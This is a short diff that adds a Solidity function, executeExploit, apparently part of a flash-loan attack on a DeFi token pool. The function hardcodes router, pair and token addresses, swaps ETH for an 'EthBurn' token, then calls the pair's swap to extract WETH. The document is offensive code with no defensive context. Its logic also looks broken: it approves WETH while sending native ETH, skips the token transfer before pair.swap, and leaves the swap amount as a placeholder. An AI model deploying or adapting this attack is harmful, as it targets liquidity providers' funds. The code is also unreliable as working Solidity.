@@ -1,0 +1,35 @@
+``` 
+<executeExploitCode>
+function executeExploit(uint256 amount) internal {
+    // Fetch WETH router and pair details
+    IUniswapV2Router02 router = IUniswapV2Router02(0x10ED43C718714eb63d5A57B78B54704E256024E);
+    IUniswapV2Pair pair = IUniswapV2Pair(0xE85372Bc82bF135344cDbB28810fe0B0931Fb358);
+
+    // Start by swapping a part of the flash loan amount for the EthBurn token
+    address[] memory path = new address[](2);
+    path[0] = router.WETH();
+    path[1] = address(0xD1c0c25c5d7BA21df222Bd2623eCBC0CB264b5f4);
+
+    // Approve the router to spend WETH
+    IWETH(router.WETH()).approve(address(router), amount);
+    
+    // Swap WETH for EthBurn token
+    router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: amount}(0, path, address(this), block.timestamp);
+
+    // Fetch the balance of EthBurn token from this contract
+    uint256 tokenBalance = IERC20(path[1]).balanceOf(address(this));
+    
+    // Approve the pair contract to spend EthBurn token
+    IERC20(path[1]).approve(address(pair), tokenBalance);
+    
+    // Get reserves from the pair for the swap
+    (uint112 reserve0, uint112 reserve1,) = pair.getReserves();
+    
+    // Calculate the amount to swap back into WETH
+    uint256 amountOut = tokenBalance; // Adjust this amount based on available reserves in the pair
+
+    // Swap EthBurn token back to WETH
+    pair.swap(amountOut, 0, address(this), new bytes(0));
+}
+</executeExploitCode>
+```
